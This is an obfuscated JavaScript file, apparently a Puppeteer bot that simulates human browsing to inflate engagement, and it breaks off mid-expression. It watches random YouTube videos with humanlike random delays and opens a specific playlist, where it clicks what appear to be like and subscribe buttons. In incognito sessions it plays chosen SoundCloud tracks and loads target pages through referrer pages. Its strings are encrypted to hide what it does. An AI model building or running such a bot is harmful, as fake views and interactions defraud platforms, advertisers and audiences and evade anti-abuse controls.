const V = b,
  U = c,
  T = d;

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x23aa + -0x1 * 0x47f + -0x1f2b);
    let h = e[f];
    if (c['MnGxDK'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x3 * 0xb3f + -0x4 * 0xb3 + 0x2489, r, s, t = -0xe78 * -0x1 + -0x19 * -0x81 + 0xd * -0x215; s = m['charAt'](t++); ~s && (r = q % (-0xe8a + 0x536 * -0x7 + 0x3308) ? r * (0x14f6 + 0x1e7e + -0x4 * 0xccd) + s : s, q++ % (-0x1c9f * 0x1 + 0x3c3 + -0x2 * -0xc70)) ? o += String['fromCharCode'](-0x26c3 + 0x25ac + 0x216 & r >> (-(-0xedd * 0x1 + 0x1dd8 + 0x1 * -0xef9) * q & -0x26c2 + 0x4 * -0x219 + 0x2f2c * 0x1)) : 0x1 * -0xadb + 0x3 * -0x703 + -0x34 * -0x9d) {
          s = n['indexOf'](s);
        }
        for (let u = -0x555 + 0x16ca + -0x1175 * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x33d * 0x4 + 0x167e + -0x97a))['slice'](-(-0x4 * 0xae + 0x1375 + -0x10bb));
        }
        return decodeURIComponent(p);
      };
      c['kBhJzc'] = i, b = arguments, c['MnGxDK'] = !![];
    }
    const j = e[0x112b + -0x1bb6 + 0x1 * 0xa8b],
      k = f + j,
      l = b[k];
    return !l ? (h = c['kBhJzc'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x13 * 0xc9 + 0xef8 + -0xc))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x2320 + 0x1042 * 0x2 + -0x43a4), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xd75d + 0xc9fb + 0x6 * 0x15c3 + (-0x9 * 0xbe5 + -0x2cbf + -0x2a14 * -0x5) * random()) : await standardWaitForNetIdle(f), await wait(-0x4ff + 0x2 * -0x1145 + 0x3b11 + (-0x1816 * 0x1 + 0x18f9 + 0x262d) * random()), 0x1112 * 0x2 + 0xbfe + -0x2e21;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x6 * 0x37a + -0x15 * -0x61 + -0x949), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x16ca + -0x39d * 0x5 + -0x4b8;
}

function a() {
  const bk = [
    'Ahr0Chm6lY9NCG',
    'CMvZDhjPy3rPBW',
    'txvPwhr2BZfswq',
    'W47cRCkHydNcSSkhbMXT',
    'DJuYuenSDK1gDa',
    'WOpdPmojf8oHWR0CW5hcT0G',
    'tJnSWPGXACkYW5VcImkw',
    'CMCVEM4Tq04VCW',
    'hSk9sfTSWOT7W6RcRZm',
    'WOBcSxnU',
    'pts/by-sit',
    'lMnVBq',
    'com/channe',
    'WRtdOg0xWRLHltyPpG',
    'Ag9TzxbHz2u',
    'BYbOAwDOBgLNAa',
    'open',
    'BmowyCoHWP3dVmo8W6eqaG',
    'zgL1Bs5JB20Vqa',
    'document.d',
    'wxHXyMTnAtfjCW',
    'zs95B3v0DwjLlG',
    'DhmG5PEL5PYS6kQE5A2x5BMvlgi',
    'zxzHBhvHDgu',
    'tLODWRldOI5cncxcSW'
  ];
  a = function() {
    return bk;
  };
  return a();
}
async function randomWait() {
  return await wait(0x167e + 0xf8d + -0x1283 + (-0x4 * 0xae + 0x1375 + 0x2cb) * random()), 0x112b + -0x1bb6 + 0x1 * 0xa8c;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x4 * 0x23 + -0x9ef * 0x1 + 0x963, -0x24ab + -0x1228 + -0x7 * -0x7d6), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x11e0b + -0xdc96 + 0x2e501) * getRandomInt(0x93b + 0x13d * 0x3 + -0xcf0, 0x1 * -0x515 + 0x3 * -0xceb + 0x2bdb), h)), 0x2dc * -0x3 + 0x10b3 + -0x81e;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x166 * 0xb + -0x20cb + 0x1169;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1495 + 0x9e8 + 0xaae]['split']('\x20');
    for (let k = -0x1b21 + 0x77 * 0x36 + 0x3 * 0xad; k < i['length']; k += -0x24be + -0x157 + 0xc7 * 0x31)
      j += i[k] * h[i[k + (-0x8e * -0x13 + 0x2641 + -0x30ca)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0xa * 0x4b + 0x9 * -0x27b + 0x679 * 0x3)['map'](l => Array['from'](l['children']))['flat'](0xa03 * 0x3 + 0x23d2 + -0x41da)['map'](l => l['childNodes'][0x870 + -0x1369 * -0x1 + 0x84 * -0x36]['childNodes'][-0x1237 + -0x9c + -0x3d * -0x4f]['childNodes'][-0xa10 * -0x1 + 0x517 + -0xf26]['childNodes'][-0x652 * 0x6 + 0x3dd + -0x1 * -0x220f]['childNodes'][0x6e8 + 0x1dad + -0x2494]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1f * -0xcb + 0x22b6 + -0x639, 0x121 * 0x16 + 0x1 * 0x885 + 0xdd3 * -0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x2b6 * -0x19 + 0x1 * 0x6cee + -0x761c);
  const h = await getMaxTime(f),
    i = Math['min']((0x9c7 * -0x1d + 0x4 * 0x59fe + 0x5 * 0x1f97) * getRandomInt(-0x962 * 0x3 + -0xdee + 0x2a16, 0x148 + -0x74 * 0x2 + -0xd * 0x7), h);
  return await wait(i), -0x1792 * 0x1 + -0x2 * 0xe17 + 0x33c1;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x23aa + -0x1 * 0x47f + -0x1f2b);
    let h = e[f];
    if (b['qJBieK'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x3 * 0xb3f + -0x4 * 0xb3 + 0x2489, s, t, u = -0xe78 * -0x1 + -0x19 * -0x81 + 0xd * -0x215; t = n['charAt'](u++); ~t && (s = r % (-0xe8a + 0x536 * -0x7 + 0x3308) ? s * (0x14f6 + 0x1e7e + -0x4 * 0xccd) + t : t, r++ % (-0x1c9f * 0x1 + 0x3c3 + -0x2 * -0xc70)) ? p += String['fromCharCode'](-0x26c3 + 0x25ac + 0x216 & s >> (-(-0xedd * 0x1 + 0x1dd8 + 0x1 * -0xef9) * r & -0x26c2 + 0x4 * -0x219 + 0x2f2c * 0x1)) : 0x1 * -0xadb + 0x3 * -0x703 + -0x34 * -0x9d) {
          t = o['indexOf'](t);
        }
        for (let v = -0x555 + 0x16ca + -0x1175 * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x33d * 0x4 + 0x167e + -0x97a))['slice'](-(-0x4 * 0xae + 0x1375 + -0x10bb));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x112b + -0x1bb6 + 0x1 * 0xa8b,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x4 * 0x23 + -0x9ef * 0x1 + 0x963; u < -0x24ab + -0x1228 + -0x1 * -0x37d3; u++) {
          p[u] = u;
        }
        for (u = -0x17d7 + -0x1262 + 0x2a39; u < 0x93b + 0x13d * 0x3 + -0xbf2; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1 * -0x515 + 0x3 * -0xceb + 0x2cd6), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x2dc * -0x3 + 0x10b3 + -0x81f, q = 0x166 * 0xb + -0x20cb + 0x1169;
        for (let v = -0x1495 + 0x9e8 + 0xaad; v < n['length']; v++) {
          u = (u + (-0x1b21 + 0x77 * 0x36 + 0x8 * 0x41)) % (-0x24be + -0x157 + 0x91 * 0x45), q = (q + p[u]) % (-0x8e * -0x13 + 0x2641 + -0x2fcb), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xa * 0x4b + 0x9 * -0x27b + 0xe3 * 0x17)]);
        }
        return t;
      };
      b['ZFeOaT'] = m, c = arguments, b['qJBieK'] = !![];
    }
    const j = e[0xa03 * 0x3 + 0x23d2 + -0x41db],
      k = f + j,
      l = c[k];
    return !l ? (b['XJWZxp'] === undefined && (b['XJWZxp'] = !![]), h = b['ZFeOaT'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x32b + -0x115d + 0xe32]['children'][-0x95c * 0x1 + 0xd99 + -0x43d]['children'][-0x487 * -0x8 + 0x1 * 0xaa7 + -0xa9 * 0x47]['children'][0x21b5 + -0x6 * -0x5de + 0x3b * -0x12b]['children'][0x1 * -0x2197 + -0x2f7 + 0x248e]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x22ba + -0x842 + -0x1a77;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1936 + -0x1 * 0x72b + -0x11a7 * 0x1 + (-0xe9 + -0x1c01 + -0x4da * -0x6) * random()
  }), await wait(-0x1501 * 0x1 + 0x7 * 0x3f + -0x9 * -0x25c + (0x9f * 0x11 + -0x4 * -0x599 + -0x5 * 0x65b) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    const R = c;
    if (!await f[R(0x17)](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0xcd5 + -0xccc + 0x7 * -0x1]['childNodes'][0x80e * -0x1 + -0x20aa + 0xd93 * 0x3]['childNodes'][-0x1129 + 0x4 * -0x7d1 + 0x306e]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0xd53 + 0x11e + 0x272 * 0x5]['childNodes'][0x1aec + 0xd3e + -0x282a]['childNodes'][-0x1c1a + 0x402 * 0x6 + 0x1a * 0x28]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x30 * -0x25 + -0xb * 0x234 + 0x114d),
          r = 0x1 * 0x1e54 + 0x7d5 + -0x2629;
        for (let u = 0x950 + -0x1a47 + 0x10f7; u < q['length']; u += -0x1c35 * 0x1 + 0x15a9 * -0x1 + 0x31e0)
          r += q[u] * k[q[u + (0x148 * 0x7 + 0xdd3 * -0x1 + 0x4dc)]];
        return r;
      }(n);
  });
  await wait((0x28bc + 0x26a2 + 0x14c6 * -0x1) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x6e1b + 0x153d1 + -0xd78c) * getRandomInt(0x2593 * 0x1 + -0x20c2 + -0x1c * 0x2c, -0x559 * -0x5 + -0x111e + -0x995), h + (0x1bba + 0x1 * 0xc3a + 0x146c * -0x1));
  return await wait(i), 0x2c * 0xa5 + -0x1c52 + -0x9;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x5b5 * -0x4 + -0x3 * -0x471 + -0x981 * -0x1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x126 * 0x19 + 0x171a + 0x1154 * 0x1 + (0x42 * -0x25 + -0x53a + 0x2 * 0x956) * Math['random']());
    });
  }, -0x307 * -0x1 + 0x2db * -0x13 + 0x71 * 0xb2);
  await wait(0x35e * 0x12e + -0x565 * -0xc7 + -0x39687);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x3 * -0x4b17 + 0x2c8a * -0x7 + 0x3036b) * getRandomInt(-0x2293 * 0x1 + -0x2417 + -0x46ae * -0x1, -0x8d6 + 0x48f + 0x118 * 0x4)), clearInterval(h), 0x33a * 0x5 + -0xeb * -0x1f + -0x2c96;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0xdcd * 0x2 + 0x22a7 + -0x1 * 0x3e41;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x61f + -0x1ea4 + -0x1886 * -0x1;
    await randomWait();
  }
  return 0x8b * 0x3e + 0x6 * -0x60b + 0x299;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1 * -0x409 + 0x1b24 + -0x171b + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x8fb * -0x4 + 0x1 * 0x745 + -0x2b31 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const S = d;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xdc2 + -0x1 * -0x1a00 + 0x2 * -0x13e1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1944 * -0x1 + 0x498 + 0x2f4 * 0x7;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x14ef0 + 0x1027b + 0xfc3d + getRandomInt(-0x185e + 0x28b1 + 0x1 * 0x2a45, 0x27c7 * 0x1 + 0xbf2b + -0x2 * 0x38e1));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1ef9 + -0x724 * -0x2 + 0x10b2), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0xde * 0x14 + 0x1024 + 0x134;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate'](S(0x13) + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x4 * 0x2cf + 0x2453 + -0x1917, -0xf * -0x83 + -0x1e7 * 0x4 + 0x3 * 0xb)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x1 * -0x2221 + -0x95 * 0x1b + -0xe6a * -0x4 + floor((-0x2158 + 0x20d6 + 0xe2 * 0x5) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xee549050 + 0x9c * -0xd52de7 + 0x1 * 0x13936874),
          0xda7b9a + 0xb37b63 + -0x10df6fd,
          -0xb659 + -0x7935 + 0x1af8e,
          -0x18b6 * -0x1 + 0x153b + -0x2d71
        ], y = [
          -0xda6 * 0x1 + 0xad * 0x6 + -0x2 * -0x4d8,
          0x1 * 0x6bc + -0x6a3 * 0x1 + 0x1 * -0x9,
          -0x3e3 + -0x9c7 + 0x6d9 * 0x2,
          -0x1256 + -0xb * 0x135 + 0x1f9d
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1 * 0x23f1 + -0x22 * 0xf + 0x37 * -0x9e)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x258b + 0x56f + 0x201c; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x18f6 + -0x1 * 0x1a0d + 0x5d * 0x3) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x47 + 0x1f * 0x11f + -0x227a] = A[-0xd * -0x39 + -0x1f83 + -0x1cae * -0x1] = A[0x7a7 + -0x1b3d + 0x1397] = A[-0x923 * 0x1 + -0x221a + 0x2b3f] = A[0x2428 + -0xb9 * -0x15 + -0x19a9 * 0x2] = A[0x668 + -0x13d * -0x12 + -0x1cae] = A[-0x188 * -0x17 + 0x2 * 0x6d3 + 0x9c5 * -0x5] = A[0x3b * 0x7 + 0x1dab + -0x1f42] = A[0x20f + -0x225d + 0x2055] = A[-0x1c16 + -0xe2d + 0x1 * 0x2a4b] = A[-0x1cbb + 0x1 * -0x18df + -0x255 * -0x17] = A[0x116b + -0x824 + 0x37 * -0x2b] = A[-0x22e * -0xe + 0x3 * 0x5cf + 0x2fe6 * -0x1] = A[-0xea5 + -0x34 * -0xb5 + -0x1613 * 0x1] = A[-0x1330 + 0x1 * -0x1bcb + 0x2f08] = A[0x2 * 0x12b7 + -0x2e * 0x2e + -0x1d1c] = A[-0x6f7 * -0x4 + -0x560 * -0x4 + 0x106f * -0x3] = 0x117b * 0x1 + -0x1461 + 0x2e6, this['blocks'] = A) : this['blocks'] = [
                0x9 * 0x137 + -0x2227 + 0x1738 * 0x1,
                0x12e + 0x3 * -0x599 + 0xf9d,
                -0x1d9 * 0xb + 0x24f4 + -0x10a1,
                -0x1c2b * -0x1 + 0xb90 + -0x5ad * 0x7,
                -0xd19 * -0x2 + 0x1 * -0x4df + -0x1553,
                0x2197 + -0x1 * -0xb75 + -0x2d0c,
                0x90f + -0x1 * 0x1174 + -0x7 * -0x133,
                -0x1 * 0x2383 + 0xb * -0x129 + -0x1 * -0x3046,
                0x8f6 + 0xd4e + -0x4b * 0x4c,
                0x2c3 * -0x2 + -0x23eb + -0x67 * -0x67,
                -0x1 * -0x1656 + 0x1182 + -0x4 * 0x9f6,
                -0x36 * 0x7f + 0x99 * 0xf + 0x5f1 * 0x3,
                0x2f * 0x67 + 0x8 * 0x43c + -0x34c9,
                -0x1da9 + -0x74f * -0x2 + -0x1 * -0xf0b,
                -0xaae + 0xeb7 * -0x1 + 0x1965,
                0x411 + 0x2069 * -0x1 + -0x716 * -0x4,
                -0xc7 * 0x4 + 0x3 * -0xe5 + 0x5cb
              ], this['h0'] = -0x6cdeb0 * -0x1d7 + -0x492fd1 * 0xc3 + 0x7fb95 * -0x52c, this['h1'] = 0x605f * -0xb589 + 0x263fe765 + 0x10de481fb, this['h2'] = -0x3a9 * -0x194fd9 + -0x79ae7ee * -0x1 + 0x347ab3cf, this['h3'] = 0x1 * -0xcda2efa + 0x3 * 0x2523997 + 0x1615d6ab, this['h4'] = -0x1b85 * -0x2547a + 0x7409bd05 + 0xfaa6389, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x173b + -0x1c1 + 0x215 * 0xc, this['finalized'] = this['hashed'] = 0x1809 + 0x370 + -0x1b79, this['first'] = 0x12e4 + 0x1 * -0x1995 + 0x6b2;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x10ea + -0x1804 + 0x71a, O = J['length'] || 0x213 * -0x3 + 0x20d2 + -0xb * 0x26b, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x2 * -0x7c1 + -0x8b1 + -0x6d1, P[0xf0f + 0xddb + -0x1 * 0x1cea] = this['block'], P[0x1 * 0xc25 + 0xb93 + 0x2 * -0xbd4] = P[0x1 * 0x147b + 0x1 * 0x1ab1 + -0x2f2b] = P[0x2524 + 0xa5d + -0xc1 * 0x3f] = P[-0x38d * -0x6 + -0x171 + -0x13da] = P[0x1 * 0x11b3 + 0x76 * -0x11 + -0x9d9] = P[-0xed3 + 0x196 + 0xd42] = P[0x83e + 0x5 * -0xda + -0x1 * 0x3f6] = P[-0x2d5 + 0x2 * 0x851 + 0x56 * -0x29] = P[-0x2 * 0xbab + -0x293 + 0x19f1] = P[0x15db + 0xbe7 + 0x61 * -0x59] = P[0x6d4 * -0x1 + -0x1df * -0x5 + 0xd * -0x31] = P[0x1db9 + -0x217d + 0x3cf] = P[-0x915 + -0xc2b + 0x154c] = P[-0xaee * 0x2 + 0x1 * -0x20f3 + 0x36dc] = P[-0x3d * 0x4a + -0xb * 0x276 + 0x2cc2] = P[0xb * -0x2b3 + 0xb06 + 0x12ba] = 0x72 * 0x37 + -0x643 + -0xd * 0x167), K) {
                    for (N = this['start']; M < O && N < 0x23c + -0x254f + 0x2353; ++M)
                      P[N >> -0x1549 * -0x1 + 0x20c1 + 0x5b * -0x98] |= J[M] << y[0x47f * -0x7 + 0x6ed * 0x1 + -0x1 * -0x188f & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x23a5 + 0x356 + -0xce9 * 0x3; ++M)
                      (L = J['charCodeAt'](M)) < 0x1 * -0xd7b + 0x1 * -0xc07 + 0x1a02 ? P[N >> -0x403 * -0x4 + -0x8b * -0x29 + -0x264d] |= L << y[0x350 + -0x1 * 0x1f70 + 0x7 * 0x405 & N++] : L < -0x1b59 + 0xd * 0x3e + 0x2033 ? (P[N >> -0x2c2 + 0x229a + 0x32f * -0xa] |= (0x1494 + -0x7a8 + -0xc2c | L >> -0x1 * -0x1040 + -0x3 * 0x80d + 0x7ed) << y[-0x19e2 + 0xf51 + -0x2a5 * -0x4 & N++], P[N >> 0x1dec + 0x4c9 + -0x22b3] |= (-0x1f5 * -0x11 + -0x1 * 0xf3 + -0x1fd2 * 0x1 | 0x1 * 0x89e + 0x2 * -0xd01 + 0x11a3 & L) << y[0x49 + 0x476 + -0x25e * 0x2 & N++]) : L < -0x6d8 * -0x22 + 0x151 * 0x102 + -0x16452 || L >= 0x15 * 0xa66 + 0x6d9 * -0xd + 0x29 * 0x24f ? (P[N >> 0x2612 + 0x2261 + -0x4871 * 0x1] |= (0x15ee + 0x2156 + -0x1 * 0x3664 | L >> -0x175f + -0x5 * -0xfe + 0x1275) << y[-0x21e5 + 0x214a + -0x1 * -0x9e & N++], P[N >> -0x4f * -0xb + 0xf * -0x133 + -0x74d * -0x2] |= (-0x4 * -0x6f5 + 0xed8 + 0x2 * -0x1516 | L >> 0x197b + -0x1d98 + 0x423 & -0x167b * -0x1 + -0x7 * 0x3a2 + -0x1 * -0x332) << y[0x1ef2 + 0x5 * -0x49d + -0x7de & N++], P[N >> -0x1c71 + -0x1 * -0x18a7 + 0x4 * 0xf3] |= (-0x14ac + 0x2606 + -0x10da | 0x22ec + 0x4 * -0x47a + 0x9 * -0x1dd & L) << y[0xd * 0x2b3 + 0xbe5 + -0x2ef9 & N++]) : (L = -0x1 * 0x1424d + 0x1b716 + 0x8b37 * 0x1 + ((0x29c + -0x1 * -0x4e7 + -0x3c * 0xf & L) << -0x23b + 0x1b1c + -0x18d7 | 0x20e5 + 0x1e63 + -0x1 * 0x3b49 & J['charCodeAt'](++M)), P[N >> 0x4 * 0x4fd + -0x1aa + -0x1248] |= (0x24c * -0xd + 0x18cb + 0x1d * 0x35 | L >> 0x1443 + 0x186 * -0x13 + 0x8c1 * 0x1) << y[0x12fe + -0x5 * 0x262 + 0xc9 * -0x9 & N++], P[N >> -0x4c6 * 0x7 + -0x7 * 0x390 + 0x3a5c] |= (0xf7 + 0xbc5 * 0x2 + -0x4cd * 0x5 | L >> 